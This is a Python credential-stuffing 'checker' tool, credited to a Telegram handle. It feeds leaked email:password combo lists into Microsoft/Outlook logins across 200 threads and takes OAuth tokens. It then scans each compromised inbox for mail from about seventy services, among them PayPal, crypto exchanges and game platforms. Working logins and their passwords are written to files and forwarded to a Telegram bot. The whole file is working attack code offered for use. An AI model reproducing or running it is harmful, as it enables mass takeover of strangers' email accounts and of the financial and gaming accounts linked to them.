import time, random, sys, os
import requests, uuid
from concurrent.futures import ThreadPoolExecutor
from art import text2art
from colorama import Fore, Style, init

init(autoreset=True)

a, b = 0, 0

c1 = '\x1b[38;5;120m'
j21 = '\x1b[38;5;204m'
p1 = '\x1b[38;5;150m'
cyan = "\033[1m\033[36m"
m = "\x1b[38;5;117m"
x = '\x1b[1;33m'
BWhite = '\x1b[1;37m'
z = '\x1b[1;31m'
green = "\033[1m\033[32m"
demo = random.randint(100, 300)
bi = random.randint(5,208)
ror1 = f'\x1b[38;5;{demo}m'
memo = random.randint(100, 300)
ror = f'\x1b[38;5;{memo}m'

from cfonts import render 

logo = render('PRAVEEN', font='block', colors=['blue', 'white'], align='center', space=True)

print("\x1b[1;39m—" * 60)
print(logo)      
print("\x1b[1;39m—" * 60)


print("🔥😈⚡ " + Fore.CYAN + "WELCOME TO CHECKER TOOL" + " ⚡😈🔥\n")


print(Fore.CYAN + "💻" + "="*58 + "💻")
print(Fore.WHITE + "   ✨ Created by: " + Fore.YELLOW + "@Pyobscura" + Fore.WHITE + " | ⚡ @Praveenridirect ✨")
print(Fore.CYAN + "💻" + "="*58 + "💻")

print(Fore.GREEN + "\n📢 I dont know who made it , i (@Pyobscura ) just edited it and added some domains and another interface.\n")
print(Fore.MAGENTA + "❌ Any Error or Problem? 🤔 Ask me in DM at 👉 @Pyobscura 💬\n\n")

Tok = input(Fore.YELLOW + "🔑 Enter Token : ")
chat_id = input(Fore.YELLOW + "🆔 Enter Chat id : ")
file = input(Fore.YELLOW + "📂 Enter Combo Path : ")

CHANNEL_1 = "https://t.me/praveenredirect"   
CHANNEL_2 = "https://t.me/Praveenfile"  

msg = """🚀 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼  𝗣𝗥𝗔𝗩𝗘𝗘𝗡 𝗧𝗼𝗼𝗹 💫  

⚡ 𝗕𝗲𝗳𝗼𝗿𝗲 𝘆𝗼𝘂 𝗰𝗮𝗻 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝘁𝗼𝗼𝗹, 𝗽𝗹𝗲𝗮𝘀𝗲 𝗷𝗼𝗶𝗻 𝗼𝘂𝗿 𝗼𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗰𝗵𝗮𝗻𝗻𝗲𝗹𝘀:  @Pyobscura
"""

url = f"https://api.telegram.org/bot{Tok}/sendMessage"

payload = {
    "chat_id": chat_id,
    "text": msg,
    "reply_markup": {
        "inline_keyboard": [
            [{"text": "🌌 𝗝𝗼𝗶𝗻  𝗖𝗵𝗮𝗻𝗻𝗲𝗹", "url": CHANNEL_1}],
            [{"text": "🚀 𝗝𝗼𝗶𝗻 𝗣𝗥𝗔𝗩𝗘𝗘𝗡 𝗖𝗵𝗮𝗻𝗻𝗲𝗹", "url": CHANNEL_2}]
        ]
    }
}

try:
    r = requests.post(url, json=payload)
    if r.status_code == 200:
        print(Fore.GREEN +"✅ Stylish Join Message sent successfully!")
    else:
        print(f"❌ Error: {r.text}")
except Exception as e:
    print(f"⚠️ Exception: {e}")

raw_url = "https://raw.githubusercontent.com/praveen-045-file/User/main/Paid-list.txt"  
try:
    response = requests.get(raw_url)
    if response.status_code == 200:
        content = response.text
        check_string = f"{Tok}|{chat_id}"
        if check_string in content:
            print("✅ Access Done")
        else:
            print("❌ Access Denied")
            exit()
    else:
        print("❌ Failed to fetch raw file. Check the URL or repo privacy.")
except Exception as e:
    print(f"⚠️ Error: {e}")
   




facebook = 0


instagram = 0


pubg = 0


tiktok = 0


twitter = 0


paypal = 0


binance = 0


netflix = 0


playstation = 0


epicgames = 0


rockstar = 0


xbox = 0


microsoft = 0


steam = 0


roblox = 0


ea = 0


linked = 0


unlinked = 0


supercell = 0


bitkub = 0


snapchat=0


youtube = 0


discord=0


amazon=0


uber,zoom,quotex,upwork,flipkart,booking,apex,genshin,airbnb,adobe,fiverr,aliexpress,hulu,freefire,ubisoft,valorant,gta,psn,cod,binomo=0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0


okx,gate,crypto,fortnite,nintendo,wargaming,coinbase,bybit,coinex,bitget,mexc,deribet,activision,metamask,deribit,bitfinex,coindcx,olymp,iq,trust=0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0


tencent,kucoin,mobilelegends,phemex,playrix,bethesda=0,0,0,0,0,0





def rrt():


        b = random.randint(5,208)


        bo = f'\x1b[38;5;{b}m'


        return bo


os.system("clear")


def bronqii():


        global facebook, pubg, instagram, tiktok, twitter, paypal, binance, netflix, playstation


        global epicgames, rockstar, xbox, microsoft, steam, roblox, ea,linked,unlinked,supercell


        global snapchat,uber,zoom,quotex,upwork,flipkart,booking,apex,genshin,airbnb,adobe,fiverr,aliexpress,hulu,freefire,ubisoft,valorant,gta,psn,cod,binomo


        global okx,gate,crypto,fortnite,nintendo,wargaming,coinbase,bybit,coinex,bitget,mexc,deribet,activision,metamask,deribit,bitfinex,coindcx,olymp,iq,trust


        global tencent,kucoin,mobilelegends,phemex,playrix,bethesda,youtube,discord,amazon


        os.system("clear")


        sys.stdout.write("\033[46A")


        sys.stdout.write(f"                  {rrt()} Total Accounts : {b+a:4d} \n")


        sys.stdout.write(f"{rrt()}Bad Login          : {b:4d}      |      {rrt()}Good Login         : {a:4d}\n")


        sys.stdout.write(f"{rrt()}Linked             : {linked:4d}      |      {rrt()}Unlinked           : {unlinked:4d}\n")


        sys.stdout.write(f"{rrt()}Instagram Hits     : {instagram:4d}      |      {rrt()}Tiktok Hits        : {tiktok:4d}\n")


        sys.stdout.write(f"{rrt()}Twitter Hits       : {twitter:4d}      |      {rrt()}Facebook Hits      : {facebook:4d}\n")


        sys.stdout.write(f"{rrt()}XBOX Hits          : {xbox:4d}      |      {rrt()}Steam Hits         : {steam:4d}\n")


        sys.stdout.write(f"{rrt()}Pubg Hits          : {pubg:4d}      |      {rrt()}PlayStation Hits   : {playstation:4d}\n")


        sys.stdout.write(f"{rrt()}Netflix Hits       : {netflix:4d}      |      {rrt()}Reblox Hits        : {roblox:4d}\n")


        sys.stdout.write(f"{rrt()}EpicGame Hits      : {epicgames:4d}      |      {rrt()}Binance Hits       : {binance:4d}\n")


        sys.stdout.write(f"{rrt()}Supercell Hits     : {supercell:4d}      |      {rrt()}EA Sports Hits     : {ea:4d}\n")


        sys.stdout.write(f"{rrt()}Paypal Hits        : {paypal:4d}      |      {rrt()}RockStar Hits      : {rockstar:4d}\n")


        sys.stdout.write(f"{rrt()}Snapchat Hits      : {snapchat:4d}      |      {rrt()}YouTube Hits       : {youtube:4d}\n")


        sys.stdout.write(f"{rrt()}Discord Hits       : {discord:4d}      |      {rrt()}Amazon Hits        : {amazon:4d}\n")


        sys.stdout.write(f"{rrt()}Uber Hits          : {uber:4d}      |      {rrt()}Airbnb Hits        : {airbnb:4d}\n")


        sys.stdout.write(f"{rrt()}Zoom Hits          : {zoom:4d}      |      {rrt()}Adobe Hits         : {adobe:4d}\n")


        sys.stdout.write(f"{rrt()}Quotex Hits        : {quotex:4d}      |      {rrt()}Fiverr Hits        : {fiverr:4d}\n")


        sys.stdout.write(f"{rrt()}Upwork Hits        : {upwork:4d}      |      {rrt()}AliExpress Hits    : {aliexpress:4d}\n")


        sys.stdout.write(f"{rrt()}Flipkart Hits      : {flipkart:4d}      |      {rrt()}Hulu Hits          : {hulu:4d}\n")


        sys.stdout.write(f"{rrt()}Booking Hits       : {booking:4d}      |      {rrt()}Free Fire Hits     : {freefire:4d}\n")


        sys.stdout.write(f"{rrt()}Genshin Hits       : {genshin:4d}      |      {rrt()}Valorant Hits      : {valorant:4d}\n")


        sys.stdout.write(f"{rrt()}Fortnite Hits      : {fortnite:4d}      |      {rrt()}GTA Hits           : {gta:4d}\n")


        sys.stdout.write(f"{rrt()}Apex Hits          : {apex:4d}      |      {rrt()}COD Hits           : {cod:4d}\n")


        sys.stdout.write(f"{rrt()}Ubisoft Hits       : {ubisoft:4d}      |      {rrt()}PSN Hits           : {psn:4d}\n")


        sys.stdout.write(f"{rrt()}Nintendo Hits      : {nintendo:4d}      |      {rrt()}MobileLegends Hits : {mobilelegends:4d}\n")


        sys.stdout.write(f"{rrt()}Wargaming Hits     : {wargaming:4d}      |      {rrt()}Playrix Hits       : {playrix:4d}\n")


        sys.stdout.write(f"{rrt()}Roblox Hits        : {roblox:4d}      |      {rrt()}Tencent Hits       : {tencent:4d}\n")


        sys.stdout.write(f"{rrt()}Activision Hits    : {activision:4d}      |      {rrt()}Bethesda Hits      : {bethesda:4d}\n")


        sys.stdout.write(f"{rrt()}Coinbase Hits      : {coinbase:4d}      |      {rrt()}KuCoin Hits        : {kucoin:4d}\n")


        sys.stdout.write(f"{rrt()}Bybit Hits         : {bybit:4d}      |      {rrt()}OKX Hits           : {okx:4d}\n")


        sys.stdout.write(f"{rrt()}MetaMask Hits      : {metamask:4d}      |      {rrt()}Gate.io Hits       : {gate:4d}\n")


        sys.stdout.write(f"{rrt()}CoinEx Hits        : {coinex:4d}      |      {rrt()}Crypto.com Hits    : {crypto:4d}\n")


        sys.stdout.write(f"{rrt()}Bitget Hits        : {bitget:4d}      |      {rrt()}Phemex Hits        : {phemex:4d}\n")


        sys.stdout.write(f"{rrt()}Deribit Hits       : {deribit:4d}      |      {rrt()}Trust Wallet Hits  : {trust:4d}\n")


        sys.stdout.write(f"{rrt()}MEXC Hits          : {mexc:4d}      |      {rrt()}IQ Option Hits     : {iq:4d}\n")


        sys.stdout.write(f"{rrt()}Bitfinex Hits      : {bitfinex:4d}      |      {rrt()}Olymp Trade Hits   : {olymp:4d}\n")


        sys.stdout.write(f"{rrt()}CoinDCX Hits       : {coindcx:4d}      |      {rrt()}Binomo Hits        : {binomo:4d}\n")


        sys.stdout.flush()











def get_infoo(Email, Password, token, CID) -> str:


    global facebook, pubg, instagram, tiktok, twitter, paypal, binance, netflix, playstation


    global epicgames, rockstar, xbox, microsoft, steam, roblox, ea,linked,unlinked,supercell


    global snapchat,uber,zoom,quotex,upwork,flipkart,booking,apex,genshin,airbnb,adobe,fiverr,aliexpress,hulu,freefire,ubisoft,valorant,gta,psn,cod,binomo


    global okx,gate,crypto,fortnite,nintendo,wargaming,coinbase,bybit,coinex,bitget,mexc,deribet,activision,metamask,deribit,bitfinex,coindcx,olymp,iq,trust


    global tencent,kucoin,mobilelegends,phemex,playrix,bethesda,youtube,discord,amazon


    he = {


        "User-Agent": "Outlook-Android/2.0",


        "Pragma": "no-cache",


        "Accept": "application/json",


        "ForceSync": "false",


        "Authorization": f"Bearer {token}",


        "X-AnchorMailbox": f"CID:{CID}",


        "Host": "substrate.office.com",


        "Connection": "Keep-Alive",


        "Accept-Encoding": "gzip"


    }





    r = requests.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=he).json()


    info_name = r.get('names', [])


    info_Loca = r.get('accounts', [])


    name = info_name[0]['displayName'] if info_name else 'N/A'


    Loca = info_Loca[0]['location'] if info_Loca else 'Unknown'





    url = f"https://outlook.live.com/owa/{Email}/startupdata.ashx?app=Mini&n=0"


    headers = {


        "Host": "outlook.live.com",


        "content-length": "0",


        "x-owa-sessionid": f"{CID}",


        "x-req-source": "Mini",


        "authorization": f"Bearer {token}",


        "user-agent": "Mozilla/5.0",


        "action": "StartupData",


        "x-owa-correlationid": f"{CID}",


        "ms-cv": "YizxQK73vePSyVZZXVeNr+.3",


        "content-type": "application/json; charset=utf-8",


        "accept": "*/*",


        "origin": "https://outlook.live.com",


        "x-requested-with": "com.microsoft.outlooklite",


        "referer": "https://outlook.live.com/",


        "accept-encoding": "gzip, deflate",


        "accept-language": "en-US,en;q=0.9"


    }





    rese = requests.post(url, headers=headers, data="").text





    V1 = '   - 💀  𝗜𝗻𝘀𝘁𝗮𝗴𝗿𝗮𝗺' if 'security@mail.instagram.com' in rese else None


    if V1: instagram += 1





    V2 = '   - 💀  𝗧𝗶𝗸𝗧𝗼𝗸' if 'no-reply@tiktok.com' in rese else None


    if V2: tiktok += 1





    V3 = '   - 💀  𝗧𝘄𝗶𝘁𝘁𝗲𝗿' if 'noreply@twitter.com' in rese else None


    if V3: twitter += 1





    V4 = '   - 💀  𝗙𝗮𝗰𝗲𝗯𝗼𝗼𝗸' if 'security@facebookmail.com' in rese else None


    if V4: facebook += 1





    V5 = '   - 💀  𝗫𝗕𝗢𝗫' if 'noreply@microsoft.com' in rese else None


    if V5: xbox += 1





    V6 = '   - 💀  𝗦𝘁𝗲𝗮𝗺' if 'noreply@steampowered.com' in rese else None


    if V6: steam += 1





    V7 = '   - 💀  𝗣𝗨𝗕𝗚' if 'noreply@pubgmobile.com' in rese else None


    if V7: pubg += 1





    V8 = '   - 💀  𝗣𝗹𝗮𝘆𝗦𝘁𝗮𝘁𝗶𝗼𝗻' if 'no-reply@playstation.com' in rese else None


    if V8: playstation += 1





    V9 = '   - 💀  𝗡𝗲𝘁𝗳𝗹𝗶𝘅' if 'no-reply@netflix.com' in rese else None


    if V9: netflix += 1





    V10 = '   - 💀  𝗥𝗼𝗯𝗹𝗼𝘅' if 'noreply@roblox.com' in rese else None


    if V10: roblox += 1





    V11 = '   - 💀  𝗘𝗽𝗶𝗰 𝗚𝗮𝗺𝗲𝘀' if 'noreply@epicgames.com' in rese else None


    if V11: epicgames += 1





    V12 = '   - 💀  𝗕𝗶𝗻𝗮𝗻𝗰𝗲' if 'no-reply@mail.binance.com' in rese else None


    if V12: binance += 1





    V13 = '   - 💀  𝗦𝘂𝗽𝗲𝗿𝗰𝗲𝗹𝗹' if 'noreply@supercell.com' in rese else None


    if V13: supercell += 1





    V14 = '   - 💀  𝗘𝗔 𝗦𝗽𝗼𝗿𝘁𝘀' if 'no-reply@ea.com' in rese else None


    if V14: ea += 1





    V15 = '   - 💀  𝗣𝗮𝘆𝗽𝗮𝗹' if 'service@paypal.com' in rese else None


    if V15: paypal += 1





    V16 = '   - 💀  𝗥𝗼𝗰𝗸𝗦𝘁𝗮𝗿' if 'noreply@rockstargames.com' in rese else None


    if V16: rockstar += 1





    V17 = '   - 💀  𝗦𝗻𝗮𝗽𝗖𝗵𝗮𝘁' if 'support@snapchat.com' in rese else None


    if V17: snapchat += 1





    V18 = '   - 💀  𝗬𝗼𝘂𝗧𝘂𝗯𝗲' if 'noreply@youtube.com' in rese else None


    if V18: youtube += 1





    V19 = '   - 💀  𝗗𝗶𝘀𝗰𝗼𝗿𝗱' if 'discord@discordapp.com' in rese else None


    if V19: discord += 1





    V20 = '   - 💀  𝗔𝗺𝗮𝘇𝗼𝗻' if 'no-reply@amazon.com' in rese else None


    if V20: amazon += 1





    V21 = '   - 💀  𝗨𝗯𝗲𝗿' if 'uber@uber.com' in rese else None


    if V21: uber += 1





    V22 = '   - 💀  𝗔𝗶𝗿𝗯𝗻𝗯' if 'noreply@airbnb.com' in rese else None


    if V22: airbnb += 1





    V23 = '   - 💀  𝗭𝗼𝗼𝗺' if 'zoom@zoom.us' in rese else None


    if V23: zoom += 1





    V24 = '   - 💀  𝗔𝗱𝗼𝗯𝗲' if 'adobe@adobe.com' in rese else None


    if V24: adobe += 1





    V25 = '   - 💀  𝗤𝘂𝗼𝘁𝗲𝘅' if 'no-reply@quotex.com' in rese else None


    if V25: quotex += 1





    V26 = '   - 💀  𝗙𝗶𝘃𝗲𝗿𝗿' if 'no-reply@fiverr.com' in rese else None


    if V26: fiverr += 1





    V27 = '   - 💀  𝗨𝗽𝘄𝗼𝗿𝗸' if 'no-reply@upwork.com' in rese else None


    if V27: upwork += 1





    V28 = '   - 💀  𝗔𝗹𝗶𝗘𝘅𝗽𝗿𝗲𝘀𝘀' if 'service@aliexpress.com' in rese else None


    if V28: aliexpress += 1





    V29 = '   - 💀  𝗙𝗹𝗶𝗽𝗸𝗮𝗿𝘁' if 'support@flipkart.com' in rese else None


    if V29: flipkart += 1





    V30 = '   - 💀  𝗛𝘂𝗹𝘂' if 'no-reply@hulu.com' in rese else None


    if V30: hulu += 1





    V31 = '   - 💀  𝗕𝗼𝗼𝗸𝗶𝗻𝗴' if 'booking@booking.com' in rese else None


    if V31: booking += 1





    V32 = '   - 💀  𝗙𝗿𝗲𝗲 𝗙𝗶𝗿𝗲' if 'support@freefire.com' in rese else None


    if V32: freefire += 1





    V33 = '   - 💀  𝗚𝗲𝗻𝘀𝗵𝗶𝗻' if 'genshin_support@mihoyo.com' in rese else None


    if V33: genshin += 1





    V34 = '   - 💀  𝗩𝗮𝗹𝗼𝗿𝗮𝗻𝘁' if 'noreply@riotgames.com' in rese else None


    if V34: valorant += 1





    V35 = '   - 💀  𝗙𝗼𝗿𝘁𝗻𝗶𝘁𝗲' if 'noreply@fortnite.com' in rese else None


    if V35: fortnite += 1





    V36 = '   - 💀  𝗚𝗧𝗔' if 'support@rockstargames.com' in rese else None


    if V36: gta += 1





    V37 = '   - 💀  𝗔𝗽𝗲𝘅 𝗟𝗲𝗴𝗲𝗻𝗱𝘀' if 'no-reply@ea.com' in rese else None


    if V37: apex += 1





    V38 = '   - 💀  𝗖𝗢𝗗' if 'support@callofduty.com' in rese else None


    if V38: cod += 1





    V39 = '   - 💀  𝗨𝗯𝗶𝘀𝗼𝗳𝘁' if 'no-reply@ubisoft.com' in rese else None


    if V39: ubisoft += 1





    V40 = '   - 💀  𝗣𝗦𝗡' if 'noreply@sony.com' in rese else None


    if V40: psn += 1





    V41 = '   - 💀  𝗡𝗶𝗻𝘁𝗲𝗻𝗱𝗼' if 'no-reply@noemail.com' in rese else None


    if V41: nintendo += 1





    V42 = '   - 💀  𝗠𝗼𝗯𝗶𝗹𝗲 𝗟𝗲𝗴𝗲𝗻𝗱𝘀' if 'support@mobilelegends.com' in rese else None


    if V42: mobilelegends += 1





    V43 = '   - 💀  𝗪𝗮𝗿𝗴𝗮𝗺𝗶𝗻𝗴' if 'support@wargaming.net' in rese else None


    if V43: wargaming += 1





    V44 = '   - 💀  𝗣𝗹𝗮𝘆𝗿𝗶𝘅' if 'support@playrix.com' in rese else None


    if V44: playrix += 1





    V45 = '   - 💀  𝗧𝗲𝗻𝗰𝗲𝗻𝘁' if 'service@tencent.com' in rese else None


    if V45: tencent += 1





    V46 = '   - 💀  𝗔𝗰𝘁𝗶𝘃𝗶𝘀𝗶𝗼𝗻' if 'support@activision.com' in rese else None


    if V46: activision += 1





    V47 = '   - 💀  𝗕𝗲𝘁𝗵𝗲𝘀𝗱𝗮' if 'support@bethesda.net' in rese else None


    if V47: bethesda += 1





    V48 = '   - 💀  𝗖𝗼𝗶𝗻𝗯𝗮𝘀𝗲' if 'no-reply@coinbase.com' in rese else None


    if V48: coinbase += 1





    V49 = '   - 💀  𝗞𝘂𝗖𝗼𝗶𝗻' if 'no-reply@kucoin.com' in rese else None


    if V49: kucoin += 1





    V50 = '   - 💀  𝗕𝘆𝗯𝗶𝘁' if 'no-reply@bybit.com' in rese else None


    if V50: bybit += 1





    V51 = '   - 💀  𝗢𝗞𝗫' if 'no-reply@okx.com' in rese else None


    if V51: okx += 1





    V52 = '   - 💀  𝗠𝗲𝘁𝗮𝗠𝗮𝘀𝗸' if 'support@metamask.io' in rese else None


    if V52: metamask += 1





    V53 = '   - 💀  𝗚𝗮𝘁𝗲.𝗶𝗼' if 'no-reply@gate.io' in rese else None


    if V53: gate += 1





    V54 = '   - 💀  𝗖𝗼𝗶𝗻𝗘𝘅' if 'service@coinex.com' in rese else None


    if V54: coinex += 1





    V55 = '   - 💀  𝗖𝗿𝘆𝗽𝘁𝗼.𝗰𝗼𝗺' if 'no-reply@crypto.com' in rese else None


    if V55: crypto += 1





    V56 = '   - 💀  𝗕𝗶𝘁𝗴𝗲𝘁' if 'support@bitget.com' in rese else None


    if V56: bitget += 1





    V57 = '   - 💀  𝗣𝗵𝗲𝗺𝗲𝘅' if 'support@phemex.com' in rese else None


    if V57: phemex += 1





    V58 = '   - 💀  𝗗𝗲𝗿𝗶𝗯𝗶𝘁' if 'support@deribit.com' in rese else None


    if V58: deribit += 1





    V59 = '   - 💀  𝗧𝗿𝘂𝘀𝘁 𝗪𝗮𝗹𝗹𝗲𝘁' if 'support@trustwallet.com' in rese else None


    if V59: trust += 1





    V60 = '   - 💀  𝗠𝗘𝗫𝗖' if 'support@mexc.com' in rese else None


    if V60: mexc += 1





    V61 = '   - 💀  𝗕𝗶𝘁𝗹𝗮𝗿𝗮' if 'support@bitlara.com' in rese else None


    if V61: bitlara += 1





    V62 = '   - 💀  𝗙𝗮𝗻𝘁𝗮𝘀𝗬' if 'support@fantasy.com' in rese else None


    if V62: fantasy += 1





    V68 = '   - 💀  𝗕𝗶𝘁𝗳𝗶𝗻𝗲𝘅' if 'support@bitfinex.com' in rese else None


    if V68: bitfinex += 1





    V69 = '   - 💀  𝗕𝗶𝗻𝗼𝗺𝗼' if 'noreply@binomo.com' in rese else None


    if V69: binomo += 1





    V70 = '   - 💀  𝗢𝗹𝘆𝗺𝗽𝗧𝗿𝗮𝗱𝗲' if 'support@olymptrade.com' in rese else None


    if V70: olymp += 1





    V71 = '   - 💀  𝗜𝗤𝗢𝗽𝘁𝗶𝗼𝗻' if 'support@iqoption.com' in rese else None


    if V71: iq+= 1





    V72 = '   - 💀  𝗖𝗼𝗶𝗻𝗗𝗖𝗫' if 'no-reply@coindcx.com' in rese else None


    if V72: coindcx += 1





    h = filter(None, [V1, V2, V3, V4, V5, V6, V7, V8, V9, V10, V11, V12, V13, V14, V15, V16, V17, V18, V19, V20,


                  V21, V22, V23, V24, V25, V26, V27, V28, V29, V30, V31, V32, V33, V34, V35,


                  V36, V37, V38, V39, V40, V41, V42, V43, V44, V45, V46, V47, V48, V49, V50,


                  V51, V52, V53, V54, V55, V56, V57, V58, V59, V60, V61, V62])


    hh = "\n".join(h)





    ff = f'''


━━━━━━━━━━━ ⚡🔥 HOTMAIL HIT 🔥⚡ ━━━━━━━━━━━

📩  Email        : {Email}

🔑  Password     : {Password}

🔗  Linked To    : {hh}

🌎  Country      : {Loca}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

👑 Cracked By : ~ @Pyobscura 🚀
'''





    print(ff)


    with open("valid_all.txt", "a", encoding='utf-8') as dd:


        dd.write(ff + "\n")


    if "💀" in hh:


            linked+=1


            with open("valid_linked.txt", "a", encoding='utf-8') as f:


                f.write(ff + "\n")


            requests.post(


                f"https://api.telegram.org/bot{Tok}/sendMessage",


                data={"chat_id": chat_id, "text": ff})


    else:


        unlinked+=1


def get_token(Email,Password,cook,hh) -> str:


	Code = hh.get('Location').split('code=')[1].split('&')[0]


	CID = cook.get('MSPCID').upper()


	try:


		url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"


		data = {"client_info": "1","client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",


	    "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",


	    "grant_type": "authorization_code",


	    "code": Code,


	    "scope": "profile openid offline_access https://outlook.office.com/M365.Access"}


		response = requests.post(url, data=data, headers={"Content-Type": "application/x-www-form-urlencoded"})


		token = response.json()["access_token"]


		get_infoo(Email,Password,token,CID)


	except Exception as e:''


def login_protocol(Email,Password,URL,PPFT,AD,MSPRequ,uaid,RefreshTokenSso,MSPOK,OParams) -> str:


	global a,b	


	try:


		lenn = f"i13=1&login={Email}&loginfmt={Email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={Password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={PPFT}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"


		Ln = len(lenn)


		headers = {


		    "Host": "login.live.com",


		    "Connection": "keep-alive",


		    "Content-Length": str(Ln),


		    "Cache-Control": "max-age=0",


		    "Upgrade-Insecure-Requests": "1",


		    "Origin": "https://login.live.com",


		    "Content-Type": "application/x-www-form-urlencoded",


		    "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0",


		    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",


		    "X-Requested-With": "com.microsoft.outlooklite",


		    "Sec-Fetch-Site": "same-origin",


		    "Sec-Fetch-Mode": "navigate",


		    "Sec-Fetch-User": "?1",


		    "Sec-Fetch-Dest": "document",


		    "Referer": f"{AD}haschrome=1",


		    "Accept-Encoding": "gzip, deflate",


		    "Accept-Language": "en-US,en;q=0.9",


		    "Cookie": f"MSPRequ={MSPRequ};uaid={uaid}; RefreshTokenSso={RefreshTokenSso}; MSPOK={MSPOK}; OParams={OParams}; MicrosoftApplicationsTelemetryDeviceId={uuid}"}


		res = requests.post(URL,data=lenn,headers=headers,allow_redirects=False)			


		cook = res.cookies.get_dict()


		hh = res.headers


		if any(key in cook for key in ["JSH", "JSHP", "ANON", "WLSSC"]) or res.text == '':


			get_token(Email,Password,cook,hh)


			a+=1


			bronqii()


		else:


			b+=1


			bronqii()


	except Exception as e:''


def get_values(Email,Password):


	headers = {


#	    "Host": "login.microsoftonline.com",


	    "Connection": "keep-alive",


	    "Upgrade-Insecure-Requests": "1",


	    "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0",


	    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",


	    "return-client-request-id": "false",


	    "client-request-id": "205740b4-7709-4500-a45b-b8e12f66c738",


	    "x-ms-sso-ignore-sso": "1",


	    "correlation-id": str(uuid.uuid4()),


	    "x-client-ver": "1.1.0+9e54a0d1",


	    "x-client-os": "28",


	    "x-client-sku": "MSAL.xplat.android",


	    "x-client-src-sku": "MSAL.xplat.android",


	    "X-Requested-With": "com.microsoft.outlooklite",


	    "Sec-Fetch-Site": "none",


	    "Sec-Fetch-Mode": "navigate",


	    "Sec-Fetch-User": "?1",


	    "Sec-Fetch-Dest": "document",


	    "Accept-Encoding": "gzip, deflate",


	    "Accept-Language": "en-US,en;q=0.9",


	}


	try:


		response = requests.get("https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint="+str(Email)+"&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D" ,headers=headers)


		cok = response.cookies.get_dict()


		URL = response.text.split("urlPost:'")[1].split("'")[0]


		PPFT = response.text.split('name="PPFT" id="i0327" value="')[1].split("',")[0]


		AD = response.url.split('haschrome=1')[0]


		MSPRequ = cok['MSPRequ']


		uaid = cok['uaid']


		RefreshTokenSso = cok['RefreshTokenSso']


		MSPOK = cok['MSPOK'],


		OParams =  cok['OParams']


		login_protocol(Email,Password,URL,PPFT,AD,MSPRequ,uaid,RefreshTokenSso,MSPOK,OParams)			


	except Exception as e:


		get_values(Email,Password)


executor = ThreadPoolExecutor(max_workers=200)


with open(file, "r",encoding='utf-8') as f:


    for line in f:


            try:


                if ':' in line:


                    email = line.strip().split(':')[0];password = line.strip().split(':')[1];executor.submit(get_values,email,password)


                else:pass


            except Exception as e:


               pass
